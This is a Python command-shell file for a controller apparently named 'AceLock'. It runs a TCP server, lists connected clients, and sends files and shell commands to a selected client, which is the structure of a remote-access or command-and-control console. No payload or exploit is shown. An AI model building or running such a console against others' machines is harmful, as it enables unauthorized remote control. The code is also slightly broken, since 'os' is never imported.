import cmd
from server import TCPServer
import shlex
import argparse
import threading
import socket
import sys
import time
import atexit


def intro():
    print("""

█████   ██████ ███████     ██       ██████   ██████ ██   ██ 
██   ██ ██      ██          ██      ██    ██ ██      ██  ██  
███████ ██      █████       ██      ██    ██ ██      █████   
██   ██ ██      ██          ██      ██    ██ ██      ██  ██  
██   ██  ██████ ███████     ███████  ██████   ██████ ██   ██ 


    """)


class CommandShell(cmd.Cmd):
    def __init__(self):
        super().__init__()
        self.intro = intro()
        self.prompt = 'AceLock> '
        self.server_object = None
        self.current_client = None
        self.server_thread = None
        self.server_running = False
        self._lock = threading.Lock()

        # Register cleanup function to ensure proper shutdown
        atexit.register(self.cleanup)

    def cleanup(self):
        """Ensure server is properly stopped when program exits"""
        if self.server_running and self.server_object:
            try:
                print("[*] Cleaning up server resources...")
                self.server_object.stop()

                # Don't join the thread here learned that the hard way
                with self._lock:
                    self.server_running = False
            except:
                pass

    def do_start_server(self, args):
        """
        Start the TCP server with specified host and port
        Usage: start_server [-host HOST] [-port PORT]
        """
        if self.server_running:
            print("[!] Server is already running")
            return

        parser = argparse.ArgumentParser(description='Start the server')
        parser.add_argument('-host', default='0.0.0.0', help='Server host address')
        parser.add_argument('-port', type=int, default=8000, help='Server port number')

        try:
            parsed_args = parser.parse_args(shlex.split(args))
            self.server_object = TCPServer(parsed_args.host, parsed_args.port)

            # Create and start the server thread
            self.server_thread = threading.Thread(
                target=self._run_server,
                name="ServerThread"
            )
            self.server_thread.daemon = True  # IMPORTANT: Make thread exit when main program exits

            with self._lock:
                self.server_running = True

            self.server_thread.start()
            time.sleep(0.5)

            if self.server_running:
                print(f"[+] Server started on {parsed_args.host}:{parsed_args.port}")
            else:
                print("[!] Failed to start server")
        except Exception as e:
            print(f"[!] Error starting server: {e}")
            with self._lock:
                self.server_running = False

    def _run_server(self):
        """Thread target function to run the server and handle exceptions"""
        try:
            self.server_object.start()
        except Exception as e:
            print(f"[!] Server error: {e}")
        finally:
            with self._lock:
                self.server_running = False

    def do_server_status(self, args):
        """
        Display the current status of the server
        Usage: server_status
        """
        if self.server_running:
            print("[+] Server is running")
            if self.server_object and hasattr(self.server_object, 'clients'):
                print(f"[+] Connected clients: {len(self.server_object.clients)}")
        else:
            print("[+] Server is not running")

    def do_list_clients(self, args):
        """
        List all connected clients with their addresses and connection details
        Usage: list_clients
        """
        if not self.server_running:
            print("[!] Server not running. Use start_server first.")
            return

        if not self.server_object or not self.server_object.clients:
            print("[!] No clients connected.")
            return

        print("\nConnected Clients:")
        print("==================")
        for i, (address, client_socket) in enumerate(self.server_object.clients.items()):
            # Check if this is the current client
            current = " (current)" if self.current_client and self.current_client == client_socket else ""

            # Get client IP and port
            ip, port = address

            # Get socket details
            try:
                socket_family = socket.AF_INET if client_socket.family == socket.AF_INET else "Unknown"
                socket_type = "TCP" if client_socket.type == socket.SOCK_STREAM else "UDP"
                is_encrypted = "Yes" if hasattr(client_socket, 'context') else "No"
            except:
                socket_family = "Unknown"
                socket_type = "Unknown"
                is_encrypted = "Unknown"

            print(f"{i + 1}. Client: {ip}:{port}{current}")
            print(f"   Connection: {socket_type} ({socket_family})")
            print(f"   Encrypted: {is_encrypted}")
            print(f"   Connected since: {time.strftime('%Y-%m-%d %H:%M:%S')}")
            print()

        # Print summary
        print(f"Total clients: {len(self.server_object.clients)}")
        print()

    def do_send_file(self, args):
        """
        Send a file to the currently selected client or a specified client
        Usage: send_file <file_path> [client_index]
        Example: send_file /path/to/file.txt
        Example: send_file /path/to/file.txt 1
        """
        if not self.server_running:
            print("[!] Server not running. Use start_server first.")
            return

        if not self.server_object or not self.server_object.clients:
            print("[!] No clients connected.")
            return

        # Parse arguments
        try:
            args_list = shlex.split(args)

            # Check if we have at least the file path
            if len(args_list) < 1:
                print("[!] Invalid arguments. Usage: send_file <file_path> [client_index]")
                return

            file_path = args_list[0]
            client_address = None

            # If client index is provided, use it
            if len(args_list) == 2:
                try:
                    client_index = int(args_list[1])
                    if client_index < 1 or client_index > len(self.server_object.clients):
                        print(f"[!] Invalid client index. Must be between 1 and {len(self.server_object.clients)}")
                        return
                    client_address = list(self.server_object.clients.keys())[client_index - 1]
                except ValueError:
                    print("[!] Client index must be a number")
                    return
            # Otherwise use the current client
            else:
                if not self.current_client:
                    print("[!] No client selected. Use select_client first or specify a client index.")
                    return

                # Find the address for the current client socket
                for address, socket in self.server_object.clients.items():
                    if socket == self.current_client:
                        client_address = address
                        break

                if not client_address:
                    print("[!] Current client not found in active connections.")
                    return

            # Check if file exists
            if not os.path.isfile(file_path):
                print(f"[!] File not found: {file_path}")
                return

            print(f"[*] Sending file '{file_path}' to client {client_address}...")

            # Call the server's send_file method
            self.server_object.send_file(file_path, client_address)

        except Exception as e:
            print(f"[!] Error sending file: {e}")

    def do_cmd(self, args):
        """
        Send a command to the currently selected client
        Usage: send_command <command>
        Example: send_command ls -la
        """
        if not self.server_running:
            print("[!] Server not running. Use start_server first.")
            return

        if not self.server_object or not self.server_object.clients:
            print("[!] No clients connected.")
            return

        if not self.current_client:
            print("[!] No client selected. Use select_client first.")
            return

        if not args:
            print("[!] No command provided. Usage: send_command <command>")
            return

        try:
            # Find the address for the current client socket
            client_address = None
            for address, socket in self.server_object.clients.items():
                if socket == self.current_client:
                    client_address = address
                    break

            if not client_address:
                print("[!] Current client not found in active connections.")
                return

            ip, port = client_address
            print(f"[*] Sending command '{args}' to client {ip}:{port}...")

            # Call the server's send_command method
            self.server_object.send_command(args)

        except Exception as e:
            print(f"[!] Error sending command: {e}")

    def do_select_client(self, args):
        """
        Select a client for interaction
        Usage: select_client <client_index>
        Example: select_client 1
        """
        if not self.server_running:
            print("[!] Server not running. Use start_server first.")
            return

        if not self.server_object or not self.server_object.clients:
            print("[!] No clients connected.")
            return

        try:
            # Parse the client index
            if not args:
                print("[!] No client index provided. Usage: select_client <client_index>")
                return

            try:
                client_index = int(args)
                if client_index < 1 or client_index > len(self.server_object.clients):
                    print(f"[!] Invalid client index. Must be between 1 and {len(self.server_object.clients)}")
                    return
            except ValueError:
                print("[!] Client index must be a number")
                return

            # Get the client address and socket from the index
            client_address = list(self.server_object.clients.keys())[client_index - 1]
            client_socket = self.server_object.clients[client_address]

            # Set the current client
            self.current_client = client_socket

            # Also update the server's current client for consistency
            self.server_object.switch_connection(client_address)

            ip, port = client_address
            print(f"[+] Selected client: {ip}:{port}")

        except Exception as e:
            print(f"[!] Error selecting client: {e}")

    def do_disconnect_client(self, args):
        """
        Forcibly disconnect a specific client
        Usage: disconnect_client <client_index>
        Example: disconnect_client 1
        """
        if not self.server_running:
            print("[!] Server not running. Use start_server first.")
            return

        if not self.server_object or not self.server_object.clients:
            print("[!] No clients connected.")
            return

        try:
            # Parse the client index
            if not args:
                print("[!] No client index provided. Usage: disconnect_client <client_index>")
                return

            try:
                client_index = int(args)
                if client_index < 1 or client_index > len(self.server_object.clients):
                    print(f"[!] Invalid client index. Must be between 1 and {len(self.server_object.clients)}")
                    return
            except ValueError:
                print("[!] Client index must be a number")
                return

            # Get the client address and socket from the index
            client_address = list(self.server_object.clients.keys())[client_index - 1]
            client_socket = self.server_object.clients[client_address]

            # Check if this is the current client
            if self.current_client and self.current_client == client_socket:
                self.current_client = None
                print("[*] Current client selection cleared")

            # Close the client socket
            ip, port = client_address
            print(f"[*] Disconnecting client: {ip}:{port}...")

            try:
                client_socket.close()
                print(f"[+] Client {ip}:{port} disconnected")
            except Exception as e:
                print(f"[!] Error closing client socket: {e}")

            # Remove the client from the server's clients dictionary
            if client_address in self.server_object.clients:
                del self.server_object.clients[client_address]
                print(f"[+] Client {ip}:{port} removed from active connections")

        except Exception as e:
            print(f"[!] Error disconnecting client: {e}")

    def do_stop_server(self, args):
        """
        Stop the server
        Usage: stop_server
        """
        if not self.server_running:
            print("[!] Server is not running")
            return

        try:
            print("[*] Stopping server...")
            self.server_object.stop()

            with self._lock:
                self.server_running = False

            print("[+] Server stopped")

            # Reset client connection if server is stopped
            self.current_client = None
        except Exception as e:
            print(f"[!] Error stopping server: {e}")

    def do_exit(self, args):
        """
        Stop the server and exit the command shell
        Usage: stop
        """
        if self.server_running:
            self.do_stop_server(args)
        print("[+] Exiting AceLock command shell...")
        return True  # Return True to exit the cmd loop


